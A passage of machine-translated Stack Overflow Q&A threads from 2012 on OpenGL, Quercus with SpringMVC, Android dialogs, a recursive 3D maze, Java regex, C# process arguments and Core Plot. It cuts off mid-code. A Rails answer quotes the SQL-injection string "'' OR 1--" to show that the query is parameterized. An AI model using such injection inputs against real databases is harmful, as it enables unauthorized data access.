我的问题与我计算这两个时间规格的差异时得到的时间有关（我使用的计算是正确的，我已经验证了它，它是 GNUs 算法）。此外，在 time 实用程序下运行程序符合我的时间。例如，我的程序名为 tcan，所以我可能会运行 [prompt]$ time ./tcan can1 -nf 10000

在具有 10000 帧的 can1 套接字上运行。（这是 FlexCAN，基于套接字的接口，顺便说一句）

然后，我用时间差来计算我得到的数据传输速度。我在时间跨度内收到了 num_frames，所以我计算帧/秒和比特/秒

我得到的总线速度是每秒 250000 位 CAN 总线速度的 10 倍。怎么会这样？根据我的程序和时间程序（以及顶级实用程序），我只能获得 2.5% 的 CPU 利用率。我计算的值有意义吗？有什么更好的我可以做的吗？我假设由于时间报告的实际时间远大于用户+系统，因此必须在某处丢失一些时间核算。另一种可能性是，也许它是正确的，我不知道，这很令人费解。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T03:13:52.147

这是一个很长的镜头，但是如果 read() 提前返回怎么办，否则它将不得不等待传入的数据？读取速度最快的数据根本没有:)

它会打乱时间，但是您是否尝试过在错误检查时执行此循环？或者通过 recv() 实现循环，除非你要求它不要这样做，否则它应该阻塞？

希望这会有所帮助。

# opengl - 我可以在 glBindBuffer 和 glBufferData 之间设置不同的参数目标值吗

> ID：13756017
> 
> 赞同：0
> 
> 时间：2012-12-07T02:22:06.863
> 
> 标签：opengl

我读了`OpenGL Programimg Guide (Sixth Edition)`.

1.  表示函数的参数`target`只能`glBindData`用`GL_ARRAY_BUFFER`和来设置`GL_ELEMENT_ARRAY_BUFFER`。
2.  但是 的参数`target`可以`glBufferData`用`GL_ARRAY_BUFFER`, `GL_ELEMENT_ARRAY_BUFFER`,`GL_PIXEL_UNPACK_BUFFER`和来设置`GL_PIXEL_PACK_BUFFER`。

为什么同一个参数可以有不同的值？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T02:30:30.007

> 上面说glBindData函数的参数target只能用GL_ARRAY_BUFFER和GL_ELEMENT_ARRAY_BUFFER来设置。

如果你的意思是`glBindBuffer`，那就错了。[您可以调用`glBindBuffer`任何目标。](http://www.opengl.org/wiki/GLAPI/glBindBuffer)

你确定你没看错书？它是说你只能绑定到那些目标，还是在那个时候根本没有谈到`GL_PIXEL_PACK/UNPACK_BUFFER`？

# php - 让 QuercusView 与 SpringMVC 一起工作

> ID：13756021
> 
> 赞同：1
> 
> 时间：2012-12-07T02:22:31.270
> 
> 标签：php, spring-mvc, quercus

我正在尝试按照[http://blog.caucho.com/2009/04/14/using-php-as-a-spring-mvc-view-via-quercus/](http://blog.caucho.com/2009/04/14/using-php-as-a-spring-mvc-view-via-quercus/)中的描述实现 SpringMVC + Quercus 。

所以我像这样设置Spring：

## web.xml

```
<servlet>
        <servlet-name>Quercus Servlet</servlet-name>
        <servlet-class>com.caucho.quercus.servlet.QuercusServlet</servlet-class>
        <init-param>
            <param-name>ini-file</param-name>
            <param-value>WEB-INF/php.ini</param-value>
        </init-param>
    </servlet>

<servlet-mapping>
        <servlet-name>Quercus Servlet</servlet-name>
        <url-pattern>*.php</url-pattern>
    </servlet-mapping> 
```

## 调度程序-servlet.xml

```
<bean id="viewResolver"
          class="org.springframework.web.servlet.view.InternalResourceViewResolver"
          p:prefix="/WEB-INF/themes/eyitope/"
          p:suffix=".jsp"/>

<bean class="org.springframework.web.servlet.view.ContentNegotiatingViewResolver">
        <property name="order" value="1" />
        <property name="ignoreAcceptHeader" value="true" />
        <property name="mediaTypes">
            <map>
                <entry key="php" value="application/php" />
            </map>
        </property>
        <property name="viewResolvers">
            <list> 
                <!-- used to handle all files with .php extension -->
                <bean class="org.springframework.web.servlet.view.UrlBasedViewResolver">
                    <property name="viewClass" value="com.caucho.spring.quercus.QuercusView"/>
                    <property name="order" value="1"/>
                    <property name="prefix" value="/WEB-INF/themes/php/"/>
                    <property name="suffix" value=".php"/>
                </bean>
            </list>
        </property>

        <!-- If a compatible view cannot be supplied by the
            ViewResolver chain, then the list of views specified through the DefaultViews property will be
            consulted.
        -->
        <property name="defaultViews">
            <list>
                <bean class="org.springframework.web.servlet.view.json.MappingJacksonJsonView" />
            </list>
        </property>
    </bean> 
```

我有一个像这样的简单控制器：

```
@Controller
@RequestMapping("account/*")
public class AccountController {

  public AccountController() {}

  @RequestMapping("signup")
    public String signupTestHandler() {
        return "signup";
    }

} 
```

QuercusView 看起来像这样：

```
package com.caucho.spring.quercus;

import java.io.*;
import java.util.*;
import java.util.logging.*;

import javax.servlet.*;
import javax.servlet.http.*;

import com.caucho.quercus.*;
import com.caucho.quercus.env.*;
import com.caucho.quercus.module.*;
import com.caucho.quercus.page.*;

import com.caucho.util.L10N;
import com.caucho.vfs.*;

import org.springframework.web.servlet.*;
import org.springframework.web.servlet.view.*;

public class QuercusView
  extends AbstractUrlBasedView
{
  private static final L10N L = new L10N(QuercusView.class);

  private static final Logger log
    = Logger.getLogger(QuercusView.class.getName());

  protected QuercusContext _quercus;
  protected ServletContext _servletContext;

  public QuercusView()
  {
    super();
  }

        protected void initServletContext(ServletContext servletContext)
  {
    _servletContext = servletContext;

    checkServletAPIVersion();

    getQuercus().setPwd(new FilePath(_servletContext.getRealPath("/")));

    getQuercus().init();
  }

  protected void checkServletAPIVersion()
  {
    int major = _servletContext.getMajorVersion();
    int minor = _servletContext.getMinorVersion();

    if (major < 2 || major == 2 && minor < 4)
      throw new QuercusRuntimeException(L.l("Quercus requires Servlet API 2.4+."));
  }

  protected void renderMergedOutputModel(Map model,
                                         HttpServletRequest request,
                                         HttpServletResponse response)
    throws Exception
  {
    Env env = null;
    WriteStream ws = null;

    try {
      Path path = getPath(request);

      QuercusPage page;

      try {
        page = getQuercus().parse(path);
      }
      catch (FileNotFoundException ex) {
        // php/2001
        log.log(Level.FINER, ex.toString(), ex);

        response.sendError(HttpServletResponse.SC_NOT_FOUND);

        return;
      }

      StreamImpl out;

      try {
        out = new VfsStream(null, response.getOutputStream());
      }
      catch (IllegalStateException e) {
        WriterStreamImpl writer = new WriterStreamImpl();
        writer.setWriter(response.getWriter());

        out = writer;
      }

      ws = new WriteStream(out);

      ws.setNewlineString("\n");

      QuercusContext quercus = getQuercus();
      quercus.setServletContext(_servletContext);

      env = quercus.createEnv(page, ws, request, response);

      // retro... thanks, Spring
      for (Object entryObj : model.entrySet()) {
        Map.Entry entry = (Map.Entry) entryObj;
        env.setScriptGlobal((String) entry.getKey(), entry.getValue());
      }

      try {
        env.start();

        env.setScriptGlobal("request", request);
        env.setScriptGlobal("response", response);
        env.setScriptGlobal("servletContext", _servletContext);

        StringValue prepend
          = quercus.getIniValue("auto_prepend_file").toStringValue(env);
        if (prepend.length() > 0) {
          Path prependPath = env.lookup(prepend);

          if (prependPath == null)
            env.error(L.l("auto_prepend_file '{0}' not found.", prepend));
          else {
            QuercusPage prependPage = getQuercus().parse(prependPath);
            prependPage.executeTop(env);
          }
        }

        env.executeTop();

        StringValue append
          = quercus.getIniValue("auto_append_file").toStringValue(env);
        if (append.length() > 0) {
          Path appendPath = env.lookup(append);

          if (appendPath == null)
            env.error(L.l("auto_append_file '{0}' not found.", append));
          else {
            QuercusPage appendPage = getQuercus().parse(appendPath);
            appendPage.executeTop(env);
          }
        }
        //   return;
      }
      catch (QuercusExitException e) {
        throw e;
      }
      catch (QuercusErrorException e) {
        throw e;
      }
      catch (QuercusLineRuntimeException e) {
        log.log(Level.FINE, e.toString(), e);

      //  return;
      }
      catch (QuercusValueException e) {
        log.log(Level.FINE, e.toString(), e);

        ws.println(e.toString());

      //  return;
      }
      catch (Throwable e) {
        if (response.isCommitted())
          e.printStackTrace(ws.getPrintWriter());

        ws = null;

        throw e;
      }
      finally {
        if (env != null)
          env.close();

        // don't want a flush for a thrown exception
        if (ws != null)
          ws.close();
      }
    }
    catch (QuercusDieException e) {
      // normal exit
      log.log(Level.FINE, e.toString(), e);
    }
    catch (QuercusExitException e) {
      // normal exit
      log.log(Level.FINER, e.toString(), e);
    }
    catch (QuercusErrorException e) {
      // error exit
      log.log(Level.FINE, e.toString(), e);
    }
    catch (RuntimeException e) {
      throw e;
    }
    catch (Throwable e) {
      throw new ServletException(e);
    }
  }

  Path getPath(HttpServletRequest req)
  {
    String scriptPath = getUrl();
    String pathInfo = QuercusRequestAdapter.getPagePathInfo(req);

    Path pwd = new FilePath(System.getProperty("user.dir"));

    Path path = pwd.lookup(req.getRealPath(scriptPath));

    if (path.isFile())
      return path;

    // XXX: include

    String fullPath;
    if (pathInfo != null)
      fullPath = scriptPath + pathInfo;
    else
      fullPath = scriptPath;

    return pwd.lookup(req.getRealPath(fullPath));
  }

  /**
   * Returns the Quercus instance.
   */
  protected QuercusContext getQuercus()
  {
    synchronized (this) {
      if (_quercus == null)
        _quercus = new QuercusContext();
    }

    return _quercus;
  }

  /**
   * Gets the script manager.
   */
  public void destroy()
  {
    _quercus.close();
  }

} 
```

注册.php

```
<?php
echo 'This is php in Java with SpringMVC as the controller having a php based view resolver called QuercusView. Awesome!';

?> 
```

当我在 /account/signup 访问资源时，出现以下异常

```
exception

org.springframework.web.util.NestedServletException: Request
processing failed; nested exception is java.lang.NullPointerException
        org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:681)
        org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:574)
        javax.servlet.http.HttpServlet.service(HttpServlet.java:621)
        javax.servlet.http.HttpServlet.service(HttpServlet.java:722)
        org.netbeans.modules.web.monitor.server.MonitorFilter.doFilter(MonitorFilter.java:393)

root cause

java.lang.NullPointerException
        com.caucho.quercus.QuercusContext.getCurrentTime(QuercusContext.java:265)
        com.caucho.quercus.env.Env.start(Env.java:1073)
        com.caucho.spring.quercus.QuercusView.renderMergedOutputModel(QuercusView.java:140)
        org.springframework.web.servlet.view.AbstractView.render(AbstractView.java:250)
        org.springframework.web.servlet.DispatcherServlet.render(DispatcherServlet.java:1047)
        org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:817)
        org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:719)
        org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:669)
        org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:574)
        javax.servlet.http.HttpServlet.service(HttpServlet.java:621)
        javax.servlet.http.HttpServlet.service(HttpServlet.java:722)
        org.netbeans.modules.web.monitor.server.MonitorFilter.doFilter(MonitorFilter.java:393) 
```

我使用 Tomcat + openejb + Spring3 作为 EJB 容器。

感谢您的帮助。

请我不太了解 SpringMVC 和 Quercus 的内部工作原理，但我希望有人可以帮助我提供一些关于如何解决这个问题的指示。

感谢您的帮助。

**编辑**

服务器启动日志中唯一可疑的条目是：

```
INFO: OpenJPA dynamically loaded a validation provider.
[LazyStopWebappClassLoader@5981f6b] warning javax.* types are not being woven because the weaver option '-Xset:weaveJavaxPackages=true' has not been specified
Dec 7, 2012 4:37:49 AM org.apache.catalina.util.LifecycleBase start
INFO: The start() method was called on component [StandardEngine[Catalina].StandardHost[localhost].StandardContext[]] after start() had already been called. The second call will be ignored.
[LazyStopWebappClassLoader@5981f6b] error can't determine implemented interfaces of missing type javax.cache.Cache
when weaving type com.caucho.quercus.QuercusContext
when weaving classes 
when weaving 
 [Xlint:cantFindType]
[LazyStopWebappClassLoader@5981f6b] error can't determine implemented interfaces of missing type com.google.appengine.api.users.UserService
when weaving type com.caucho.quercus.lib.gae.GaeUserService
when weaving classes 
when weaving 
 [Xlint:cantFindType] 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T08:59:50.750

工作副本[https://github.com/PaulWeb/TestJavaPhp](https://github.com/PaulWeb/TestJavaPhp) Stanle 可能是正确的旧版本，但他们忘记添加开始

```
protected QuercusContext getQuercus()
  {
    synchronized (this) {
      if (this._quercus == null) {
        this._quercus = new QuercusContext();
         this._quercus.start();
      }
    }
    return this._quercus;
  } 
```

如果你想从 java 传递到 php 那么你必须使用 env.setGlobalValue

# android - 我的 Dialog.show() 不起作用

> ID：13756026
> 
> 赞同：0
> 
> 时间：2012-12-07T02:23:22.643
> 
> 标签：android, android-layout, android-asynctask, progressdialog

调用 MainActivity 时，我正在制作加载效果。我不知道为什么我的 Dialog.show 不能在 AsyncTask 中工作。我只看到它关闭的那一刻，但在此之前从未出现过对话框。谢谢你。

```
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    new LoadViewTask().execute(); 
    setContentView(R.layout.activity_main);
....}

private class LoadViewTask extends AsyncTask<Void, Integer, Void>
{
    @Override
    protected void onPreExecute() { 
        progressDialog = ProgressDialog.show(MainActivity.this,"Loading...","Loading application View, please wait...", false, false);  

    }

    @Override
    protected Void doInBackground(Void... params) 
    {
        try 
        {
            synchronized (this) 
            {
                int counter = 0;
                while(counter <= 4)
                {
                    this.wait(1000);
                                            counter++;
                    publishProgress(counter*25);
                }
            }
        } 
        catch (InterruptedException e) 
        {
            e.printStackTrace();
        }
        return null;
    }

    @Override
    protected void onProgressUpdate(Integer... values) 
    {
        progressDialog.setProgress(values[0]);
    }

    @Override
    protected void onPostExecute(Void result) 
    {
        progressDialog.dismiss();
    }

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T02:34:19.893

在开始异步任务之前尝试设置内容视图：

```
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    // Set the content view first
    setContentView(R.layout.activity_main);
    new LoadViewTask().execute(); 
....} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T02:25:57.600

您应该使用 FragmentDialogs 在 Android 中使用对话框。

这里解释得很好：

[http://developer.android.com/intl/es/reference/android/app/DialogFragment.html](http://developer.android.com/intl/es/reference/android/app/DialogFragment.html)

# c++ - 3d迷宫递归方法 - C++

> ID：13756028
> 
> 赞同：1
> 
> 时间：2012-12-07T02:23:32.583
> 
> 标签：c++, algorithm, methods, recursion, maze

我正在用 C++ 制作一个 3D 迷宫。我在使用递归方法来查找两个端点之间的有效路径时遇到问题（起点是 m[0][0][0]；终点是 m[7][7][7];）。它检查数组中的位置。如果它的内容是 1，那么它是路径的有效部分；如果为 0，则它不是路径的有效部分。这是我的方法：

```
bool Maze::findPath(int row, int column, int level,string path){
cout << "findPath " << row << ", " << column << ", " << level << " value " << m[row][column][level] << endl;
if(row < 0 || row > 7 || column < 0 || column > 7 || level < 0 || level > 7 ){
    cout << "Out of bounds" << endl;
    //system("PAUSE");
    return false;
}
else if(m[row][column][level] == 0){
    cout << "spot is zero" << endl;
    //system("PAUSE");
    return false;
}
else if(visited[row][column][level] == 1){
    cout << "visited" << endl;
    return false;
}
else if(row == 7 && column == 7 && level == 7 && m[row][column][level] == 1){
    cout << "Found!" << endl;
    //system("PAUSE");
    return true;
}
else{
    visited[row][column][level] = 1;
    //cout << "searching..." << endl;
    if(row < 7 && findPath(row + 1,column,level,path))
        return true;
    if(column < 7 && findPath(row,column + 1,level,path))
        return true;
    if(level < 7 && findPath(row,column,level + 1,path))
        return true;
    if(row > 7 && findPath(row - 1,column,level,path))
        return true;
    if(column > 7 && findPath(row,column - 1,level,path))
        return true;
    if(level > 7 && findPath(row,column,level - 1,path))
        return true;
}
return false; 
```

}

因此，该方法检查“越界”，路径上的无效点（零），访问位置。我不确定我到底错过了什么，但该方法对无法解决的迷宫返回 true。有人能看到我在递归调用中可能遗漏的一些明显错误吗？谢谢

编辑：修复了一些代码错误，但它似乎仍然是“解决”无法解决的迷宫。

这是一个可解迷宫的例子，它说它是不可能解决的：

```
1 0 0 0 0 0 0 1 
0 0 0 0 0 1 0 0 
0 0 0 0 0 0 0 0 
0 0 0 1 0 0 0 1 
0 0 0 1 0 0 0 0 
1 0 0 1 0 1 0 0 
0 0 0 1 0 0 0 0 
1 0 0 1 0 0 0 1 

1 0 0 0 0 0 0 0 
1 0 0 0 0 0 0 0 
1 1 1 1 0 0 0 0 
0 0 0 0 0 0 0 0 
0 0 0 0 0 0 0 0 
1 0 0 0 0 0 0 0 
0 1 1 0 0 0 0 0 
0 0 0 1 0 1 1 1 

0 0 0 0 0 0 0 1 
0 0 0 0 0 0 0 0 
0 0 0 1 0 0 0 1 
0 0 0 0 0 0 0 0 
0 0 0 0 0 0 0 0 
0 1 0 0 0 0 0 0 
0 0 0 0 0 0 0 1 
0 0 0 1 0 0 0 0 

0 0 0 0 0 0 0 0 
0 0 0 0 0 0 0 1 
0 0 0 1 0 0 0 0 
0 0 0 0 0 0 0 0 
0 0 0 0 0 0 0 0 
1 0 0 0 0 1 0 0 
0 0 0 0 0 0 0 0 
0 0 0 0 0 0 0 1 

1 1 1 1 0 0 0 0 
0 0 0 1 0 0 0 0 
0 0 0 1 0 0 0 1 
0 0 0 0 0 0 1 0 
0 0 0 0 0 0 1 0 
1 0 0 0 0 1 0 0 
0 1 0 0 0 0 0 0 
1 0 0 0 0 0 0 1 

1 0 0 0 0 0 0 0 
0 0 0 0 0 0 1 0 
0 0 0 0 0 0 1 0 
0 0 0 0 0 0 1 0 
1 1 1 1 0 0 0 0 
0 0 0 1 0 0 0 0 
0 0 0 1 0 0 0 0 
1 1 1 1 0 0 0 1 

1 1 1 1 1 1 1 1 
0 0 0 0 0 0 0 0 
0 0 0 0 0 0 0 0 
0 0 0 0 0 0 0 0 
0 0 1 0 0 0 0 0 
0 0 1 0 0 0 0 0 
0 0 1 0 0 0 0 0 
0 0 1 0 0 0 0 0 

0 0 1 0 0 0 0 1 
0 0 1 0 0 0 0 1 
0 0 1 0 0 0 0 1 
0 0 1 0 0 0 0 1 
0 0 1 1 0 0 0 1 
0 0 0 1 0 0 0 1 
0 0 0 1 0 0 0 1 
0 0 0 1 1 1 0 1 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-07T02:24:51.203

（和类似的递归调用）存在一个问题`findPath(++row,column,level,path)`：您不希望变量增量延续到其他递归调用。（例如，变量`row`in`findPath(row,++column,level,path)`会受到第一次递归调用的影响。）

改用`findPath(row + 1,column,level,path)`（和类似的）。

此外，在最后三个递归调用中，您没有进行正确的测试：

```
//instead of level < 7
if(level < 7 && findPath(--row,column,level,path)) //should be row > 0
    return true;
if(level < 7 && findPath(row,--column,level,path)) //should be column > 0
    return true;
if(level < 7 && findPath(row,column,--level,path)) //should be level > 0
    return true; 
```

编辑

但是，您实际上并不需要这些测试，因为您`out of bounds`在递归函数的顶部过滤掉了错误。因此，这些调用可以简化为：

```
return  findPath(row + 1,column,level,path) || findPath(row,column + 1,level,path)
          || findPath(row,column,level + 1,path) || findPath(row - 1,column,level,path)
          || findPath(row,column - 1,level,path) || findPath(row,column,level - 1,path); 
```

此外，该测试`&& m[row][column][level] == 1`是多余的，因为它`else if(m[row][column][level] == 0)`负责处理。（顺便说一下，我`m[7][7][7]`什至会在第一次调用这个函数之前检查一下。）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-11-01T05:49:59.130

我刚刚完成了这个算法作为一个班级的作业，我们只使用了一个5x5的块作为迷宫，但是我发现它每次从任何角度到达块时都会非常缓慢地测试所有可能性，我发现程序可以通过将数组中的值设置为 0 来显着加快速度，因为您确定它们没有用。我在`return false`函数结束时做了。

# ruby-on-rails - Rails、SQL 注入和参数

> ID：13756030
> 
> 赞同：2
> 
> 时间：2012-12-07T02:23:51.033
> 
> 标签：ruby-on-rails, ruby-on-rails-3, security, sql-injection

我的控制器中有这行代码。

```
user = User.find_by_email(params[:email]) 
```

我应该担心这行代码的 SQL 注入吗？我见过的大多数 sql 注入示例都涉及条件。我认为这是肯定的，但需要一些外部输入。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T03:24:36.890

您应该只需要在 SQL 片段方法中担心这一点`where()`，`connection.execute()`或者`find_by_sql()`，尽管如果您想确保可以使用类似`sanitize_sql()`. 我建议通读[这个](http://guides.rubyonrails.org/security.html#injection)，最值得注意的是第 8 节。

更新：例如

```
User.find_by_email("'' OR 1--") 
```

将评估为

```
SELECT "users".* FROM "users" WHERE "users"."email" = $1 LIMIT 1  [["email", "'' OR 1--"]] 
```

这将被消毒。

# java - java中的正则表达式提取一个数字

> ID：13756042
> 
> 赞同：1
> 
> 时间：2012-12-07T02:25:13.040
> 
> 标签：java, regex

我开始使用 java 中的正则表达式，并试图从字符串中提取数字 99999，如下所示：

```
<result name="response" numFound="99999" start="0"> 
```

你能建议我实现这一目标的最有效的正则表达式吗？谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T02:36:54.410

如果这是一次性情况，您可以使用包中的`Pattern`和`Matcher`类，`java.util.regex`如下所示并提取值：

```
Pattern pattern = Pattern.compile("numFound=\"([0-9]+)\"");
Matcher matcher = pattern.matcher("<result name=\"response\" numFound=\"99999\" start=\"0\">");

if (matcher.find())
{
    System.out.println(matcher.group(1));
} 
```

否则，强烈建议使用适当的 HTML Parser[`Jericho`](http://jericho.htmlparser.net/docs/index.html)来解析 HTML 并相应地读取属性。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-07T02:43:17.000

用于`replaceAll()`仅在一行中提取您想要的部分。

```
String number = input.replaceAll(".*numFound=\"(\\d+).*", "$1"); 
```

* * *

下面是一些测试代码：

```
public static void main(String[] args) {
    String input = "<result name=\"response\" numFound=\"99999\" start=\"0\">";
    String number = input.replaceAll(".*numFound=\"(\\d+).*", "$1");
    System.out.println(number);
} 
```

输出：

```
99999 
```

# c# - 启动可执行文件并传递参数

> ID：13756045
> 
> 赞同：0
> 
> 时间：2012-12-07T02:25:59.700
> 
> 标签：c#, command, executable

我以前肯定做过类似的事情，但有些事情不正常，我不能 100% 确定它是什么。

我有一个可执行`executable.exe`文件，它接受一个文件，执行一些魔术并在其他地方输出第二个文件。所以当我通过 CMD 运行这个可执行文件时，我需要做的就是传递`"path1"`和`"path2"`. 我将路径放在引号中，因为它们可能有空格。

无论如何，所以我在我的 c# 应用程序中所做的是：

```
public void methodToRunExecutable()
{
var exePath = "\""+ "C:\\SomePathToAnExecutable" + "\"";
var firstFilePath = "C:\\PathToFirstFile\\NameOfFile.txt"
var secondFilePath= "C:\\PathToSecondFile\\NameOfFile.txt"

Process.Start(exePath, "\""firstFilePath + "\" \"" + secondFilePath+"\"")
} 
```

但是，我在调试时注意到`"\""`实际显示为`\"`，就像反斜杠没有转义引号一样。

需要明确的是，当我运行 CMD exe 时，我所要做的就是：

```
"C:\\PathToFirstFile\\NameOfFile.txt" "C:\\PathToSecondFile\\NameOfFile.txt" 
```

而且效果很好。关于我做错了什么的任何想法？是因为`"`没有被逃脱吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T02:28:18.067

转义是丑陋且容易出错的。使用`@`，您将无需逃避：

```
var firstFilePath = @"C:\PathToFirstFile\NameOfFile.txt" 
```

`Process`使用这种方式也可能更容易：

```
using (Process process = new Process())
{
    process.StartInfo.FileName = exePath;
    process.StartInfo.Arguments = ""; // args here
    process.Start();
} 
```

# ios - coreplot iOS 中 x 轴和 y 轴上的动态数据

> ID：13756047
> 
> 赞同：2
> 
> 时间：2012-12-07T02:26:27.150
> 
> 标签：ios, graph, charts, ios6, core-plot

如何在 coreplot iOS 中的 x 轴/y 轴中获取动态数据：目前在此处使用演示代码：在每列下方我需要 x 轴上的年份，这本身是动态的，y 轴收入金额。我如何动态地做到这一点?

```
 //
    //  CPDStockPriceStore.m
    //  CorePlotDemo
    //
    //  NB: Price data obtained from Yahoo! Finance:
    //  http://finance.yahoo.com/q/hp?s=AAPL
    //  http://finance.yahoo.com/q/hp?s=GOOG
    //  http://finance.yahoo.com/q/hp?s=MSFT
    //
    //  Created by Steve Baranski on 5/4/12.
    //  Copyright (c) 2012 komorka technology, llc. All rights reserved.
    //

    #import "CPDStockPriceStore.h"

    @interface CPDStockPriceStore ()

    @end

    @implementation CPDStockPriceStore

    #pragma mark - Class methods

    + (CPDStockPriceStore *)sharedInstance
    {
        static CPDStockPriceStore *sharedInstance;

        static dispatch_once_t once;
        dispatch_once(&once, ^{
            sharedInstance = [[self alloc] init];      
        });

        return sharedInstance;
    }

    #pragma mark - API methods

    - (NSArray *)tickerSymbols
    {
        static NSArray *symbols = nil;
        if (!symbols)
        {
            symbols = [NSArray arrayWithObjects:
                       @"AAPL", 
                       @"GOOG", 
                       @"MSFT", 
                       nil];
        }
        return symbols;
    }

    - (NSArray *)dailyPortfolioPrices
    {
        static NSArray *prices = nil;
        if (!prices)
        {
            prices = [NSArray arrayWithObjects:
                      [NSDecimalNumber numberWithFloat:582.13], 
                      [NSDecimalNumber numberWithFloat:604.43], 
                      [NSDecimalNumber numberWithFloat:32.01], 
                      nil];
        }
        return prices;
    }

    - (NSArray *)datesInWeek
    {
        static NSArray *dates = nil;
        if (!dates)
        {
            dates = [NSArray arrayWithObjects:
                     @"4/23", 
                     @"4/24", 
                     @"4/25",
                     @"4/26", 
                     @"4/27",                   
                     nil];
        }
        return dates;
    }

    - (NSArray *)weeklyPrices:(NSString *)tickerSymbol
    {
        if ([CPDTickerSymbolAAPL isEqualToString:[tickerSymbol uppercaseString]] == YES)
        {
            return [self weeklyAaplPrices];
        }
        else if ([CPDTickerSymbolGOOG isEqualToString:[tickerSymbol uppercaseString]] == YES)
        {
            return [self weeklyGoogPrices];
        }
        else if ([CPDTickerSymbolMSFT isEqualToString:[tickerSymbol uppercaseString]] == YES)
        {
            return [self weeklyMsftPrices];
        }
        return [NSArray array];
    }

    - (NSArray *)datesInMonth
    {
        static NSArray *dates = nil;
        if (!dates)
        {
            dates = [NSArray arrayWithObjects:
                     @"2", 
                     @"3", 
                     @"4",
                     @"5",
                     @"9", 
                     @"10", 
                     @"11",
                     @"12", 
                     @"13",
                     @"16", 
                     @"17", 
                     @"18",
                     @"19", 
                     @"20", 
                     @"23", 
                     @"24", 
                     @"25",
                     @"26", 
                     @"27",
                     @"30",                   
                     nil];
        }
        return dates;
    }

    - (NSArray *)monthlyPrices:(NSString *)tickerSymbol
    {
        if ([CPDTickerSymbolAAPL isEqualToString:[tickerSymbol uppercaseString]] == YES)
        {
            return [self monthlyAaplPrices];
        }
        else if ([CPDTickerSymbolGOOG isEqualToString:[tickerSymbol uppercaseString]] == YES)
        {
            return [self monthlyGoogPrices];
        }
        else if ([CPDTickerSymbolMSFT isEqualToString:[tickerSymbol uppercaseString]] == YES)
        {
            return [self monthlyMsftPrices];
        }
        return [NSArray array];
    }

    #pragma mark - Private behavior

    - (NSArray *)weeklyAaplPrices
    {
        static NSArray *prices = nil;
        if (!prices)
        {
            prices = [NSArray arrayWithObjects:
                      [NSDecimalNumber numberWithFloat:571.70], 
                      [NSDecimalNumber numberWithFloat:560.28], 
                      [NSDecimalNumber numberWithFloat:610.00], 
                      [NSDecimalNumber numberWithFloat:607.70], 
                      [NSDecimalNumber numberWithFloat:603.00],                   
                      nil];
        }
        return prices;
    }

    - (NSArray *)weeklyGoogPrices
    {
        static NSArray *prices = nil;
        if (!prices)
        {
            prices = [NSArray arrayWithObjects:
                      [NSDecimalNumber numberWithFloat:597.60], 
                      [NSDecimalNumber numberWithFloat:601.27], 
                      [NSDecimalNumber numberWithFloat:609.72], 
                      [NSDecimalNumber numberWithFloat:615.47], 
                      [NSDecimalNumber numberWithFloat:614.98],                   
                      nil];
        }
        return prices;
    }

    - (NSArray *)weeklyMsftPrices
    {
        static NSArray *prices = nil;
        if (!prices)
        {
            prices = [NSArray arrayWithObjects:
                      [NSDecimalNumber numberWithFloat:32.12], 
                      [NSDecimalNumber numberWithFloat:31.92], 
                      [NSDecimalNumber numberWithFloat:32.20], 
                      [NSDecimalNumber numberWithFloat:32.11], 
                      [NSDecimalNumber numberWithFloat:31.98],                   
                      nil];
        }
        return prices;
    }

    - (NSArray *)monthlyAaplPrices
    {
        static NSArray *prices = nil;
        if (!prices)
        {
            prices = [NSArray arrayWithObjects:
                      [NSDecimalNumber numberWithFloat:618.63], 
                      [NSDecimalNumber numberWithFloat:629.32], 
                      [NSDecimalNumber numberWithFloat:624.31], 
                      [NSDecimalNumber numberWithFloat:633.68], 
                      [NSDecimalNumber numberWithFloat:636.23], 
                      [NSDecimalNumber numberWithFloat:628.44], 
                      [NSDecimalNumber numberWithFloat:626.20], 
                      [NSDecimalNumber numberWithFloat:622.77], 
                      [NSDecimalNumber numberWithFloat:605.23],
                      [NSDecimalNumber numberWithFloat:580.13], 
                      [NSDecimalNumber numberWithFloat:609.70], 
                      [NSDecimalNumber numberWithFloat:608.34], 
                      [NSDecimalNumber numberWithFloat:587.44], 
                      [NSDecimalNumber numberWithFloat:572.98],
                      [NSDecimalNumber numberWithFloat:571.70], 
                      [NSDecimalNumber numberWithFloat:560.28], 
                      [NSDecimalNumber numberWithFloat:610.00], 
                      [NSDecimalNumber numberWithFloat:607.70], 
                      [NSDecimalNumber numberWithFloat:603.00],
                      [NSDecimalNumber numberWithFloat:583.98],                  
                      nil];
        }
        return prices;
    }

    - (NSArray *)monthlyGoogPrices
    {
        static NSArray *prices = nil;
        if (!prices)
        {
            prices = [NSArray arrayWithObjects:
                      [NSDecimalNumber numberWithFloat:646.92], 
                      [NSDecimalNumber numberWithFloat:642.62], 
                      [NSDecimalNumber numberWithFloat:635.15], 
                      [NSDecimalNumber numberWithFloat:632.32], 
                      [NSDecimalNumber numberWithFloat:630.84], 
                      [NSDecimalNumber numberWithFloat:626.86], 
                      [NSDecimalNumber numberWithFloat:635.96], 
                      [NSDecimalNumber numberWithFloat:651.01], 
                      [NSDecimalNumber numberWithFloat:624.60], 
                      [NSDecimalNumber numberWithFloat:606.07], 
                      [NSDecimalNumber numberWithFloat:609.57], 
                      [NSDecimalNumber numberWithFloat:607.45], 
                      [NSDecimalNumber numberWithFloat:599.30], 
                      [NSDecimalNumber numberWithFloat:596.06], 
